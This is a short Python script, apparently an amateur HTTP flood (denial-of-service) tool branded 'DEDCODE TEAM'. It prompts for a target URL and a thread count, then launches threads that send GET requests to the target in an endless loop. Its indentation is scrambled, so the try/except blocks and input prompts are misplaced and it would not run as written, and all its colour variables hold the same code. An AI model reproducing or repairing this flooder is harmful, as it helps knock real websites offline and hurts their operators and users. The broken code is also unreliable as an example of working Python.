import colorama
import threading
import requests
import os
import sys
import time
# Colors
yellow='\033[92m'
cyan='\033[92m'
pink='\033[92m'
green = '\033[92m'
red ='\033[92m'
white ='\033[92m'
black ='\033[92m'
# Requests

os.system("clear")
print(green + f"З А Г Р У З К А....")
time.sleep(1.5)
os.system("clear")

print( '''🅳🅴🅳🅲🅾🅳🅴 🆃🅴🅰🅼''')

def dos(target):
    while True:
        try:
           res = requests.get(target)
           print(colorama.Fore.YELLOW + "Request sent!" + colorama.Fore.WHITE)
    except requests.exceptions.ConnectionError:
           print(colorama.Fore.RED + "[+] " + colorama.Fore.LIGHTGREEN_EX + "Connection error!")
     threads = 120
           url = input("URL: ")
       try:
     threads = int(input("Threads: "))
    except ValueError:
     exit("Threads count is incorrect!")

    if threads == 0:
     exit("Threads count is incorrect!")
if not url.__contains__("http"):
     exit("URL doesnt contains http or https!")
if not url.__contains__("."):
     exit("Invalid domain")
for i in range(0, threads):
thr = threading.Thread(target=dos, args=(url,))
thr.start()
print(str(i + 1) + " thread started!")
